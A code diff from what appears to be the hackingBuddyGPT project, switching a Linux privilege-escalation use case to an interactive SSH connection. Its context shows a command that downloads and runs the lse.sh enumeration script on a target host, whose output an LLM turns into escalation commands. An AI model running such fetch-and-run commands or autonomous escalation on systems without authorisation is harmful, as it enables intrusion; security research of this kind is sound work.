@@ -1,8 +1,8 @@
 from mako.template import Template
 
-from hackingBuddyGPT.capabilities import SSHRunCommand
+from hackingBuddyGPT.capabilities import SSHInteractiveRunCommand
 from hackingBuddyGPT.usecases.usecase import UseCase, use_case
-from hackingBuddyGPT.utils.connectors.ssh_connection import SSHConnection
+from hackingBuddyGPT.utils.connectors.ssh_interactive_connection import SSHInteractiveConnection
 from hackingBuddyGPT.utils.llm import LiteLLM
 
 from .linux_privesc import PrivEscLinux
@@ -20,7 +20,7 @@ short sentence.""")
 
 @use_case("Linux Privilege Escalation using lse.sh for initial guidance")
 class ExPrivEscLinuxLSEUseCase(UseCase):
-    conn: SSHConnection = None
+    conn: SSHInteractiveConnection = None
     max_turns: int = 20
     enable_explanation: bool = False
     enable_update_state: bool = False
@@ -35,7 +35,7 @@ class ExPrivEscLinuxLSEUseCase(UseCase):
 
         run_cmd = "wget -q 'https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh' -O lse.sh;chmod 700 lse.sh; ./lse.sh -c -i -l 0 | grep -v 'nope$' | grep -v 'skip$'"
 
-        result = await SSHRunCommand(conn=self.conn, timeout=120)(run_cmd)
+        result = await SSHInteractiveRunCommand(conn=self.conn, timeout=120)(run_cmd)
 
         self.log.console.print("[yellow]got the output: " + result)
         cmd = self.llm.get_response(template_lse, lse_output=result, number=3)
